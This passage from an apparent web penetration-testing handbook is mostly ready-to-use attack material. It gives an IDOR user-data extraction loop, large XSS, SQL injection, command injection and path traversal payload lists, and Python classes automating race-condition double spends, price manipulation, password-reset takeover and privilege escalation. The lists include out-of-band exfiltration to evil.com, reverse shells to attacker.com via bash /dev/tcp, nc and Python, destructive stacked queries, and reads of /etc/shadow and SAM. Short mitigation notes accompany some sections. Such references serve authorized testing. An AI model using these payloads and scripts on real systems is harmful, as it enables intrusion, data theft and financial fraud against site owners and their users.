\`\`\`python
import requests

# Automate extraction
for user_id in range(1, 10001):
    response = requests.get(
        f'https://target.com/api/users/{user_id}',
        headers={'Authorization': 'Bearer ATTACKER_TOKEN'}
    )
    
    if response.status_code == 200:
        save_user_data(response.json())
\`\`\`

#### Phase 4: Post-Exploitation
[What attacker does with stolen data]

### Attack Tree

\`\`\`
                    [Compromise User Data]
                            |
        ┌───────────────────┼───────────────────┐
        |                   |                   |
  [Via API IDOR]   [Via SQL Injection]  [Via XSS]
        |                   |                   |
    [Success]           [Blocked]          [Blocked]
        |
  [Extract 5K Users]
\`\`\`

### Detection Opportunities

1. **Network Level**
   - Unusual API call patterns (many sequential IDs)
   - High volume from single IP
   - Access to many different user profiles

2. **Application Level**
   - Logs show user accessing others' data
   - Rate limiting triggers
   - Anomaly detection alerts

3. **User Level**
   - Users report unusual account activity
   - Failed login attempts with stolen credentials

### Indicators of Compromise (IoCs)

- **Network:** Requests to /api/users/* with sequential IDs
- **Logs:** Same auth token accessing 100+ different user IDs
- **Behavior:** Automated tool user-agent pattern

### Mitigation

**Immediate:**
- Add authorization checks to /api/users/{id}
- Rate limit API endpoints
- Alert on suspicious access patterns

**Long-term:**
- Implement proper RBAC
- Use UUIDs instead of sequential IDs
- Add API gateway with security policies

### Lessons Learned

1. [Key takeaway 1]
2. [Key takeaway 2]
3. [Key takeaway 3]
```

### 19.1 XSS Payload Comprehensive Collection

```javascript
const XSSPayloads = {
    // Basic XSS
    basic: [
        "<script>alert(1)</script>",
        "<script>alert('XSS')</script>",
        "<script>alert(document.domain)</script>",
        "<script>alert(document.cookie)</script>",
        "<script>alert(window.origin)</script>",
        "<script>confirm(1)</script>",
        "<script>prompt(1)</script>",
        "<script>console.log(1)</script>",
    ],
    
    // Image-based XSS
    image: [
        "<img src=x onerror=alert(1)>",
        "<img src=x onerror='alert(1)'>",
        "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
        "<img src=x onerror=alert`1`>",
        "<img src=x onerror=alert\\u00281\\u0029>",
        "<img/src=x/onerror=alert(1)>",
        "<img\\x09src=x\\x09onerror=alert(1)>",
        "<img\\x0Asrc=x\\x0Aonerror=alert(1)>",
        "<img\\x0Dsrc=x\\x0Donerror=alert(1)>",
        '<img src=x onerror="alert(1)">',
        "<img src='x' onerror='alert(1)'>",
        "<img src=\"x\" onerror=\"alert(1)\">",
        "<img src=x a='' onerror=alert(1)>",
        "<img/src/onerror=alert(1)>",
        "<img src=`x` onerror=`alert(1)`>",
    ],
    
    // SVG-based XSS
    svg: [
        "<svg onload=alert(1)>",
        "<svg/onload=alert(1)>",
        "<svg onload=alert('XSS')>",
        "<svg><script>alert(1)</script></svg>",
        "<svg><animatetransform onbegin=alert(1)>",
        "<svg><set attributename=onload to=alert(1)>",
        "<svg><animate attributename=onclick values=alert(1)>",
        '<svg><animate onbegin="alert(1)" attributeName=x dur=1s>',
        "<svg><discard onbegin=alert(1)>",
        '<svg onload="javascript:alert(1)">',
    ],
    
    // Body-based XSS
    body: [
        "<body onload=alert(1)>",
        "<body onpageshow=alert(1)>",
        "<body onfocus=alert(1)>",
        "<body onhashchange=alert(1)>",
        "<body onscroll=alert(1)>",
        "<body onresize=alert(1)>",
    ],
    
    // IFrame-based XSS
    iframe: [
        '<iframe src="javascript:alert(1)">',
        "<iframe src=javascript:alert(1)>",
        "<iframe src=\"data:text/html,<script>alert(1)</script>\">",
        "<iframe srcdoc=\"<script>alert(1)</script>\">",
        "<iframe onload=alert(1)>",
        "<iframe src=x onerror=alert(1)>",
    ],
    
    // Input-based XSS
    input: [
        "<input onfocus=alert(1) autofocus>",
        "<input onblur=alert(1) autofocus><input autofocus>",
        "<input value=1 onmouseover=alert(1)>",
        "<input type=image src=x onerror=alert(1)>",
        "<input type=text value=x onfocus=alert(1) autofocus>",
        "<input formaction=javascript:alert(1)>",
        "<input type=\"hidden\" accesskey=\"X\" onclick=\"alert(1)\">", // Triggered by Alt+Shift+X
    ],
    
    // Form-based XSS
    form: [
        '<form action="javascript:alert(1)"><input type=submit>',
        '<form action=javascript:alert(1)><button>X</button>',
        "<form><button formaction=javascript:alert(1)>X</button>",
        '<form><input formaction="javascript:alert(1)" type="submit">',
    ],
    
    // Link-based XSS
    link: [
        '<a href="javascript:alert(1)">click</a>',
        "<a href=javascript:alert(1)>click</a>",
        "<a href='javascript:alert(1)'>click</a>",
        "<a href=`javascript:alert(1)`>click</a>",
        "<a href=javascript:alert(String.fromCharCode(88,83,83))>click</a>",
    ],
    
    // Video/Audio-based XSS
    media: [
        "<video src=x onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",
        "<video><source onerror=alert(1)>",
        "<video poster=javascript:alert(1)>",
    ],
    
    // Object/Embed-based XSS
    object: [
        '<object data="javascript:alert(1)">',
        '<object data="data:text/html,<script>alert(1)</script>">',
        '<embed src="javascript:alert(1)">',
        '<embed src="data:text/html,<script>alert(1)</script>">',
    ],
    
    // Details/Summary-based XSS
    details: [
        "<details open ontoggle=alert(1)>",
        "<details ontoggle=alert(1)><summary>X</summary>",
    ],
    
    // Select-based XSS
    select: [
        "<select onfocus=alert(1) autofocus>",
        "<select><option onerror=alert(1)>X</option>",
    ],
    
    // Marquee-based XSS
    marquee: [
        "<marquee onstart=alert(1)>",
        "<marquee onfinish=alert(1)>X</marquee>",
        "<marquee loop=1 width=0 onfinish=alert(1)>X</marquee>",
    ],
    
    // Math-based XSS (MathML)
    math: [
        "<math><mtext><table><mglyph><style><!--</style><img title=--></mglyph><img src=1 onerror=alert(1)>",
        "<math><mtext><script>alert(1)</script></mtext></math>",
    ],
    
    // Filter bypass XSS
    bypass: [
        // Case variation
        "<ScRiPt>alert(1)</ScRiPt>",
        "<IMG SRC=x ONERROR=alert(1)>",
        
        // Whitespace/newline bypass
        "<script\\x09>alert(1)</script>",
        "<script\\x0A>alert(1)</script>",
        "<script\\x0D>alert(1)</script>",
        
        // Comment bypass
        "<scr<!-->ipt>alert(1)</scr<!-->ipt>",
        "<!--><script>alert(1)</script>-->",
        
        // Null byte
        "<scr\\x00ipt>alert(1)</scr\\x00ipt>",
        
        // Encoding bypass
        "<script>\\u0061lert(1)</script>",
        "<script>\\x61lert(1)</script>",
        "<script>eval('\\x61lert(1)')</script>",
        "<script>eval(atob('YWxlcnQoMSk='))</script>",
        
        // Double encoding
        "%253Cscript%253Ealert(1)%253C/script%253E",
        
        // URL encoding
        "%3Cscript%3Ealert(1)%3C/script%3E",
        
        // HTML entity encoding
        "&lt;script&gt;alert(1)&lt;/script&gt;",
        
        // Unicode encoding
        "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
    ],
    
    // Polyglot XSS (works in multiple contexts)
    polyglot: [
        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\\\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
        "'\"--></Script><Script>alert(1)</Script>",
        "\"><img src=x onerror=alert(1)//>",
    ],
    
    // Mutation XSS (mXSS)
    mutation: [
        "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
        "<listing><img src=x onerror=alert(1)></listing>",
        "<style><img src=x onerror=alert(1)></style>",
    ],
    
    // WAF bypass
    waf_bypass: [
        // Cloudflare bypass
        "<svg/onload=alert(1)>",
        "<details open ontoggle=alert(1)>",
        
        // ModSecurity bypass
        "<script\\x0Asrc=//⑮.₨></script>",
        
        // Generic WAF bypass
        "<img src onerror=alert(1)>",
        "<svg><script/href=data:,alert(1) />",
    ],
    
    // Context-specific XSS
    contexts: {
        html: "<img src=x onerror=alert(1)>",
        attribute: "\" onload=\"alert(1)",
        javascript: "'-alert(1)-'",
        json: '{"xss":"</script><script>alert(1)</script>"}',
        url: "javascript:alert(1)",
        css: "expression(alert(1))",  // IE only
    }
};

### 19.2 SQL Injection Payload Collection

```sql
-- Authentication Bypass
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' #
' OR '1'='1'/*
admin' --
admin' #
admin'/*
' or 1=1--
' or 1=1#
' or 1=1/*
') or ('1'='1
') or ('1'='1--
') or ('1'='1#

-- Boolean-based Blind SQLi
' AND '1'='1
' AND '1'='2
' AND 1=1--
' AND 1=2--
' AND (SELECT COUNT(*) FROM users)>0--
' AND SUBSTRING(database(),1,1)='a'--
' AND ASCII(SUBSTRING(database(),1,1))>97--

-- Time-based Blind SQLi (MySQL)
' AND SLEEP(5)--
' AND (SELECT 1 FROM (SELECT(SLEEP(5)))A)--
' AND BENCHMARK(10000000,MD5('A'))--
' UNION SELECT IF(1=1,SLEEP(5),0)--

-- Time-based Blind SQLi (PostgreSQL)
'; SELECT pg_sleep(5)--
' AND (SELECT 1 FROM pg_sleep(5))--

-- Time-based Blind SQLi (SQL Server)
'; WAITFOR DELAY '00:00:05'--
' AND WAITFOR DELAY '00:00:05'--

-- Time-based Blind SQLi (Oracle)
' AND DBMS_LOCK.SLEEP(5)--

-- UNION-based SQLi
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION ALL SELECT NULL--
' UNION SELECT 1,2,3--
' UNION SELECT username,password FROM users--
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT GROUP_CONCAT(username),GROUP_CONCAT(password) FROM users--

-- Error-based SQLi (MySQL)
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--
' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--
' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--
' AND EXP(~(SELECT * FROM (SELECT user())x))--

-- Error-based SQLi (PostgreSQL)
' AND 1=CAST((SELECT version()) AS INT)--
' AND 1=CAST((SELECT current_database()) AS INT)--

-- Error-based SQLi (SQL Server)
' AND 1=CONVERT(INT,(SELECT @@version))--
' AND 1=CONVERT(INT,(SELECT DB_NAME()))--

-- Error-based SQLi (Oracle)
' AND 1=CAST((SELECT banner FROM v$version WHERE rownum=1) AS INT)--
' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual))--

-- Stacked Queries
'; DROP TABLE users--
'; CREATE TABLE temp (id INT)--
'; INSERT INTO users VALUES ('hacker','password')--
'; UPDATE users SET password='hacked' WHERE username='admin'--
'; DELETE FROM users WHERE username!='admin'--
'; EXEC xp_cmdshell('whoami')--  # SQL Server

-- Out-of-band SQLi (MySQL)
' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT+@@version),'.evil.com\\\\share'))--

-- Out-of-band SQLi (SQL Server)
'; EXEC master..xp_dirtree '\\\\\\\\evil.com\\\\share'--
'; EXEC master..xp_cmdshell 'nslookup '+(SELECT TOP 1 name FROM sys.databases)+'.evil.com'--

-- Out-of-band SQLi (Oracle)
' || UTL_HTTP.REQUEST('http://evil.com/'||(SELECT user FROM dual)||'/') FROM dual--
' || UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual)||'.evil.com') FROM dual--

-- Second-order SQLi
admin'--  /* Stored in database, executed later */

-- NoSQL Injection (MongoDB)
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
{"username": "admin", "password": {"$ne": ""}}
{"$where": "this.username == 'admin'"}
{"$where": "return true"}

-- Filter Bypass
/**/' OR /**/1=1--
'/**/OR/**/1=1--
' %4f%52 1=1--  # URL encoded 'OR'
' UnIoN SeLeCt NULL--  # Case variation
'\t\tOR\t\t1=1--  # Tabs
'\n\nOR\n\n1=1--  # Newlines
```

### 19.3 Command Injection Payload Collection

```bash
# Basic Command Injection
; ls
| ls
& ls
&& ls
|| ls
` ls `
$(ls)
> ls
< ls

# Windows
; dir
| dir
& dir
&& dir
|| dir

# Filter Bypass
;l\\s
;l''s
;l""s
;l\\'s
;l\\\\s
;$IFS
;${IFS}
;$IFS$()

# Time-based Detection
; sleep 10
| sleep 10
& sleep 10
; ping -c 10 127.0.0.1
| ping -c 10 127.0.0.1

# Data Exfiltration
; curl http://evil.com/$(whoami)
; wget http://evil.com/$(id)
; nslookup $(hostname).evil.com

# Reverse Shell
; bash -i >& /dev/tcp/attacker.com/4444 0>&1
; nc attacker.com 4444 -e /bin/bash
; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# File Operations
; cat /etc/passwd
; cat /etc/shadow
; ls -la /
; find / -name "*.conf"
; grep -r "password" /

# Windows File Operations
; type C:\\Windows\\System32\\config\\SAM
; dir C:\\
; findstr /si password *.txt *.xml *.config
```

### 19.4 Path Traversal Payload Collection

```
# Basic Path Traversal
../../etc/passwd
../../../etc/passwd
../../../../etc/passwd
../../../../../../etc/passwd

# Windows
..\\..\\windows\\system32\\config\\sam
..\\..\\..\\windows\\win.ini

# URL Encoding
..%2F..%2Fetc%2Fpasswd
..%2F..%2F..%2Fetc%2Fpasswd

# Double URL Encoding
..%252F..%252Fetc%252Fpasswd

# UTF-8 Encoding
..%c0%af..%c0%afetc%c0%afpasswd

# Null Byte Injection
../../etc/passwd%00
../../etc/passwd%00.jpg

# Absolute Paths
/etc/passwd
C:\\Windows\\System32\\config\\SAM

# UNC Paths (Windows)
\\\\127.0.0.1\\c$\\windows\\win.ini
\\\\localhost\\c$\\windows\\win.ini

# Bypass Filters
....//....//etc/passwd
....//...//../etc/passwd
....\\....\\windows\\win.ini
```

## 20. Advanced Exploitation Techniques & Real-World Attack Patterns

### 20.1 Business Logic Vulnerability Exploitation

Business logic flaws are often more critical than technical vulnerabilities because they directly impact business operations, are unique to each application, and cannot be detected by automated scanners.

#### 20.1.1 Race Condition Exploitation in Financial Systems

```python
import concurrent.futures
import requests
import threading

class RaceConditionExploiter:
    """
    Exploit race conditions in financial/e-commerce systems
    Common scenarios: Double spend, voucher reuse, inventory corruption
    """
    
    def __init__(self, target_url, auth_token):
        self.target_url = target_url
        self.auth_token = auth_token
        self.success_lock = threading.Lock()
        self.successes = []
    
    def test_double_spend_voucher(self, voucher_code):
        """
        Race Condition: Use same voucher code multiple times simultaneously
        Expected behavior: Voucher should be single-use
        Vulnerability: Lack of atomic check-and-mark operation
        """
        
        def apply_voucher(thread_id):
            try:
                response = requests.post(
                    f"{self.target_url}/api/cart/apply-voucher",
                    json={"code": voucher_code},
                    headers={"Authorization": f"Bearer {self.auth_token}"}
                )
                
                if response.status_code == 200:
                    with self.success_lock:
                        self.successes.append({
                            'thread': thread_id,
                            'response': response.json(),
                            'timestamp': time.time()
                        })
                        print(f"[Thread {thread_id}] SUCCESS: Voucher applied!")
                
                return {
                    'thread_id': thread_id,
                    'status_code': response.status_code,
                    'response': response.json() if response.text else None
                }
            except Exception as e:
                return {
                    'thread_id': thread_id,
                    'error': str(e)
                }
        
        # Execute 10 simultaneous requests
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(apply_voucher, i) for i in range(10)]
            results = [f.result() for f in concurrent.futures.as_completed(futures)]
        
        return {
            'test': 'Double spend voucher code',
            'total_attempts': len(results),
            'successful_applications': len(self.successes),
            'vulnerable': len(self.successes) > 1,
            'severity': 'CRITICAL' if len(self.successes) > 1 else 'NONE',
            'business_impact': f'${10 * (len(self.successes) - 1)} lost' if len(self.successes) > 1 else 'None',
            'results': results,
            'mitigation': [
                'Use database transactions with proper isolation level (SERIALIZABLE)',
                'Implement optimistic locking with version numbers',
                'Use distributed locks (Redis SETNX)',
                'Mark voucher as "being_used" atomically before applying'
            ]
        }
    
    def test_concurrent_withdrawal_attack(self, account_id, withdraw_amount):
        """
        Race Condition: Withdraw more money than account balance
        Scenario: Account has $100, submit 10x $100 withdrawal requests simultaneously
        Expected: Only 1 should succeed
        Vulnerability: Check balance → withdraw (not atomic)
        """
        
        def withdraw_money(thread_id):
            try:
                response = requests.post(
                    f"{self.target_url}/api/account/withdraw",
                    json={
                        "account_id": account_id,
                        "amount": withdraw_amount
                    },
                    headers={"Authorization": f"Bearer {self.auth_token}"}
                )
                
                if response.status_code == 200:
                    with self.success_lock:
                        self.successes.append({
                            'thread': thread_id,
                            'amount': withdraw_amount,
                            'timestamp': time.time()
                        })
                
                return response.status_code == 200
            except:
                return False
        
        # Get initial balance
        balance_response = requests.get(
            f"{self.target_url}/api/account/{account_id}/balance",
            headers={"Authorization": f"Bearer {self.auth_token}"}
        )
        initial_balance = balance_response.json().get('balance', 0)
        
        # Execute concurrent withdrawals
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            futures = [executor.submit(withdraw_money, i) for i in range(20)]
            results = [f.result() for f in concurrent.futures.as_completed(futures)]
        
        # Check final balance
        final_balance_response = requests.get(
            f"{self.target_url}/api/account/{account_id}/balance",
            headers={"Authorization": f"Bearer {self.auth_token}"}
        )
        final_balance = final_balance_response.json().get('balance', 0)
        
        successful_withdrawals = sum(results)
        expected_final = initial_balance - (successful_withdrawals * withdraw_amount)
        
        return {
            'test': 'Concurrent withdrawal attack',
            'initial_balance': initial_balance,
            'withdrawal_amount': withdraw_amount,
            'concurrent_attempts': 20,
            'successful_withdrawals': successful_withdrawals,
            'expected_final_balance': expected_final,
            'actual_final_balance': final_balance,
            'vulnerable': final_balance < expected_final,
            'amount_over_withdrawn': abs(expected_final - final_balance) if final_balance < expected_final else 0,
            'severity': 'CRITICAL',
            'exploitation_example': f'''
                Initial balance: ${initial_balance}
                Submitted: 20 x ${withdraw_amount} withdrawals simultaneously
                Expected successes: {initial_balance // withdraw_amount}
                Actual successes: {successful_withdrawals}
                Money created out of thin air: ${abs(expected_final - final_balance)}
            ''',
            'mitigation': [
                'SELECT ... FOR UPDATE to lock row during transaction',
                'Use atomic UPDATE: UPDATE accounts SET balance = balance - $1 WHERE id = $2 AND balance >= $3',
                'Optimistic locking with version field',
                'Distributed locking for microservices architecture'
            ]
        }
    
    def test_inventory_overselling(self, product_id, quantity_available):
        """
        Race Condition: Sell more items than in stock
        Scenario: 5 items in stock, 10 users buy simultaneously
        Expected: First 5 succeed, rest fail
        Vulnerability: Check inventory → decrease inventory (not atomic)
        """
        
        def purchase_item(thread_id):
            try:
                response = requests.post(
                    f"{self.target_url}/api/purchase",
                    json={
                        "product_id": product_id,
                        "quantity": 1
                    },
                    headers={"Authorization": f"Bearer {self.auth_token}"}
                )
                
                return response.status_code == 200
            except:
                return False
        
        # Attempt to purchase more than available
        concurrent_buyers = quantity_available * 2
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=concurrent_buyers) as executor:
            futures = [executor.submit(purchase_item, i) for i in range(concurrent_buyers)]
            results = [f.result() for f in concurrent.futures.as_completed(futures)]
        
        successful_purchases = sum(results)
        
        return {
            'test': 'Inventory overselling',
            'items_available': quantity_available,
            'purchase_attempts': concurrent_buyers,
            'successful_purchases': successful_purchases,
            'oversold_by': max(0, successful_purchases - quantity_available),
            'vulnerable': successful_purchases > quantity_available,
            'severity': 'HIGH',
            'mitigation': [
                'SELECT ... FOR UPDATE in transaction',
                'Atomic decrement: UPDATE products SET stock = stock - 1 WHERE id = $1 AND stock > 0',
                'Pre-reserve inventory before payment',
                'Queue-based purchase system'
            ]
        }
    
    def test_referral_bonus_manipulation(self, referral_code):
        """
        Race Condition: Claim referral bonus multiple times
        Scenario: Sign up with referral code in multiple tabs simultaneously
        Expected: Bonus credited once
        Vulnerability: Referral bonus logic not idempotent
        """
        
        def signup_with_referral(thread_id):
            try:
                response = requests.post(
                    f"{self.target_url}/api/signup",
                    json={
                        "email": f"user{thread_id}_{time.time()}@test.com",
                        "password": "password123",
                        "referral_code": referral_code
                    }
                )
                
                if response.status_code == 200:
                    # Check if bonus was credited
                    user_data = response.json()
                    if user_data.get('bonus_credited'):
                        with self.success_lock:
                            self.successes.append(thread_id)
                
                return response.status_code == 200
            except:
                return False
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(signup_with_referral, i) for i in range(10)]
            results = [f.result() for f in concurrent.futures.as_completed(futures)]
        
        return {
            'test': 'Referral bonus manipulation',
            'signup_attempts': len(results),
            'bonuses_credited': len(self.successes),
            'vulnerable': len(self.successes) > 1,
            'excess_bonuses': max(0, len(self.successes) - 1),
            'mitigation': [
                'Use distributed lock on referral code',
                'Database constraint on (referrer_id, referee_id) unique',
                'Idempotency key for bonus credit operation',
                'Queue-based async processing with deduplication'
            ]
        }

#### 20.1.2 Price Manipulation Attacks

```python
class PriceManipulationAttacks:
    """
    Business logic attacks targeting pricing systems
    Common in e-commerce, SaaS billing, booking systems
    """
    
    def test_negative_quantity_attack(self, api_url, product_id):
        """
        Attack: Order negative quantity to receive money
        Example: Order -5 items at $10 each = -$50 (credit $50)
        """
        payloads = [
            {"product_id": product_id, "quantity": -1},
            {"product_id": product_id, "quantity": -100},
            {"product_id": product_id, "quantity": -999999},
        ]
        
        results = []
        
        for payload in payloads:
            response = requests.post(
                f"{api_url}/api/cart/add",
                json=payload
            )
            
            results.append({
                'payload': payload,
                'accepted': response.status_code == 200,
                'cart_total': response.json().get('total') if response.status_code == 200 else None,
                'vulnerable': response.status_code == 200 and response.json().get('total', 0) < 0
            })
        
        return {
            'test': 'Negative quantity attack',
            'results': results,
            'vulnerable': any(r['vulnerable'] for r in results),
            'severity': 'CRITICAL',
            'impact': 'Attacker receives money instead of paying',
            'mitigation': [
                'Server-side validation: quantity > 0',
                'Use unsigned integer types',
                'Business logic check: total must be >= 0'
            ]
        }
    
    def test_currency_mismatch_attack(self, api_url):
        """
        Attack: Order in one currency, pay in another
        Example: Price shown in USD, pay in cents (100x less)
        """
        test_cases = [
            {
                'description': 'Price in dollars, payment in cents',
                'cart_currency': 'USD',
                'payment_currency': 'cents',
                'price_shown': 100.00,
                'amount_charged': 100  # cents instead of dollars
            },
            {
                'description': 'Price in USD, pay in weaker currency',
                'cart_currency': 'USD',
                'payment_currency': 'IDR',  # Indonesian Rupiah
                'price_shown': 100.00,
                'amount_charged': 100  # IDR is ~14000 to 1 USD
            }
        ]
        
        results = []
        
        for test_case in test_cases:
            # Add item to cart
            cart_response = requests.post(
                f"{api_url}/api/cart/add",
                json={"product_id": 1, "quantity": 1}
            )
            
            # Attempt payment with different currency
            payment_response = requests.post(
                f"{api_url}/api/payment/charge",
                json={
                    "amount": test_case['amount_charged'],
                    "currency": test_case['payment_currency']
                }
            )
            
            results.append({
                'test_case': test_case['description'],
                'payment_accepted': payment_response.status_code == 200,
                'vulnerable': payment_response.status_code == 200,
                'potential_savings': f"{(test_case['price_shown'] - test_case['amount_charged']) / test_case['price_shown'] * 100}%"
            })
        
        return {
            'test': 'Currency mismatch attack',
            'results': results,
            'mitigation': [
                'Validate currency matches throughout checkout flow',
                'Store prices in smallest unit (cents) to avoid confusion',
                'Server-side currency conversion validation',
                'Payment gateway amount verification'
            ]
        }
    
    def test_discount_stacking_attack(self, api_url):
        """
        Attack: Stack multiple discounts when only one should apply
        Example: 10% + 20% + 50% off coupon + loyalty discount
        """
        
        # Apply multiple discounts
        discount_codes = [
            'SAVE10',    # 10% off
            'SAVE20',    # 20% off
            'SUMMER50',  # 50% off
            'LOYALTY15', # 15% loyalty discount
            'FIRST10',   # 10% first purchase
        ]
        
        original_price = 100.00
        
        results = {
            'original_price': original_price,
            'discounts_applied': []
        }
        
        for code in discount_codes:
            response = requests.post(
                f"{api_url}/api/cart/apply-discount",
                json={"code": code}
            )
            
            if response.status_code == 200:
                results['discounts_applied'].append({
                    'code': code,
                    'new_total': response.json().get('total'),
                    'discount_amount': response.json().get('discount')
                })
        
        if results['discounts_applied']:
            final_total = results['discounts_applied'][-1]['new_total']
            total_discount = original_price - final_total
            discount_percentage = (total_discount / original_price) * 100
            
            results.update({
                'final_total': final_total,
                'total_discount_amount': total_discount,
                'total_discount_percentage': discount_percentage,
                'vulnerable': len(results['discounts_applied']) > 1,
                'severity': 'HIGH' if discount_percentage > 50 else 'MEDIUM',
                'business_impact': f'Lost ${total_discount} per order'
            })
        
        return results
    
    def test_integer_overflow_price(self, api_url):
        """
        Attack: Integer overflow in price calculation
        Example: Buy MAX_INT items to wrap to negative price
        """
        
        overflow_values = [
            2147483647,      # INT_MAX (32-bit)
            2147483648,      # INT_MAX + 1
            9223372036854775807,  # LONG_MAX (64-bit)
        ]
        
        results = []
        
        for quantity in overflow_values:
            response = requests.post(
                f"{api_url}/api/cart/add",
                json={"product_id": 1, "quantity": quantity}
            )
            
            if response.status_code == 200:
                total = response.json().get('total', 0)
                results.append({
                    'quantity': quantity,
                    'total': total,
                    'vulnerable': total < 0 or total < quantity,
                    'note': 'Price wrapped to negative or small value'
                })
        
        return {
            'test': 'Integer overflow in price',
            'results': results,
            'mitigation': [
                'Use arbitrary precision decimals (not integers) for money',
                'Validate quantity < reasonable maximum',
                'Check for overflow before multiplication',
                'Use database numeric types with appropriate precision'
            ]
        }
    
    def test_free_shipping_threshold_bypass(self, api_url):
        """
        Attack: Manipulate cart to get free shipping
        Example: Free shipping over $50, add $60 items + $-10 gift card
        """
        
        # Add items to cart
        response1 = requests.post(
            f"{api_url}/api/cart/add",
            json={"product_id": 1, "price": 60.00, "quantity": 1}
        )
        
        # Apply gift card with negative value
        response2 = requests.post(
            f"{api_url}/api/cart/apply-gift-card",
            json={"code": "GIFT", "amount": -10.00}
        )
        
        # Check if free shipping was applied
        cart_response = requests.get(f"{api_url}/api/cart")
        cart_data = cart_response.json()
        
        return {
            'test': 'Free shipping threshold bypass',
            'subtotal': cart_data.get('subtotal'),
            'shipping_cost': cart_data.get('shipping'),
            'total': cart_data.get('total'),
            'vulnerable': cart_data.get('shipping') == 0 and cart_data.get('total') < 50,
            'mitigation': [
                'Calculate shipping based on pre-discount subtotal',
                'Validate gift card amounts are positive',
                'Check threshold against merchandise total only'
            ]
        }

#### 20.1.3 Authentication & Authorization Logic Flaws

```python
class AuthLogicFlaws:
    """
    Business logic vulnerabilities in authentication and authorization
    """
    
    def test_password_reset_account_takeover(self, target_url):
        """
        Attack: Take over account via password reset logic flaws
        Common flaws:
        - Reset token not invalidated after use
        - Token not bound to user account
        - Token predictable or brute-forceable
        - No rate limiting on reset attempts
        """
        
        tests = []
        
        # Test 1: Token reuse
        # Request reset for victim
        reset_response = requests.post(
            f"{target_url}/api/forgot-password",
            json={"email": "[email protected]"}
        )
        
        # In real scenario, attacker would intercept token
        # For testing, assume token is 'ABC123'
        test_token = 'ABC123'
        
        # Use token once
        use1 = requests.post(
            f"{target_url}/api/reset-password",
            json={"token": test_token, "new_password": "newpass1"}
        )
        
        # Try to use same token again
        use2 = requests.post(
            f"{target_url}/api/reset-password",
            json={"token": test_token, "new_password": "newpass2"}
        )
        
        tests.append({
            'test': 'Token reuse',
            'first_use': use1.status_code,
            'second_use': use2.status_code,
            'vulnerable': use2.status_code == 200,
            'severity': 'CRITICAL'
        })
        
        # Test 2: Token not bound to account
        # Get reset token for Alice
        alice_reset = requests.post(
            f"{target_url}/api/forgot-password",
            json={"email": "[email protected]"}
        )
        
        alice_token = 'ALICE_TOKEN'  # Would be from email
        
        # Try to use Alice's token to reset Bob's password
        bob_reset = requests.post(
            f"{target_url}/api/reset-password",
            json={
                "token": alice_token,
                "email": "[email protected]",  # Different user!
                "new_password": "hacked123"
            }
        )
        
        tests.append({
            'test': 'Token not bound to account',
            'vulnerable': bob_reset.status_code == 200,
            'severity': 'CRITICAL',
            'impact': 'Can reset any account with any valid token'
        })
        
        # Test 3: Rate limiting
        # Attempt many password resets
        reset_attempts = []
        for i in range(100):
            response = requests.post(
                f"{target_url}/api/forgot-password",
                json={"email": "[email protected]"}
            )
            reset_attempts.append(response.status_code)
        
        rate_limited = any(status == 429 for status in reset_attempts)
        
        tests.append({
            'test': 'Rate limiting on password reset',
            'attempts': len(reset_attempts),
            'successful': reset_attempts.count(200),
            'vulnerable': not rate_limited,
            'severity': 'MEDIUM'
        })
        
        return {
            'password_reset_tests': tests,
            'critical_issues': sum(1 for t in tests if t.get('severity') == 'CRITICAL' and t.get('vulnerable'))
        }
    
    def test_privilege_escalation_via_parameter_manipulation(self, target_url, user_token):
        """
        Attack: Escalate privileges by modifying user attributes
        Common in REST APIs where user can update own profile
        """
        
        escalation_attempts = [
            {"role": "admin"},
            {"is_admin": True},
            {"permissions": ["*"]},
            {"user_type": "administrator"},
            {"access_level": 99},
            {"is_superuser": True},
            {"roles": ["admin", "superuser"]},
        ]
        
        results = []
        
        for payload in escalation_attempts:
            # Try to update user profile with elevated attributes
            response = requests.patch(
                f"{target_url}/api/users/me",
                json=payload,
                headers={"Authorization": f"Bearer {user_token}"}
            )
            
            if response.status_code == 200:
                # Verify if elevation actually worked
                profile_response = requests.get(
                    f"{target_url}/api/users/me",
                    headers={"Authorization": f"Bearer {user_token}"}
                )
                
                user_data = profile_response.json()
                
                # Check if any of the escalation fields are present
                escalated = any(key in user_data and user_data[key] == value for key, value in payload.items())
                
                results.append({
                    'payload': payload,
                    'accepted': True,
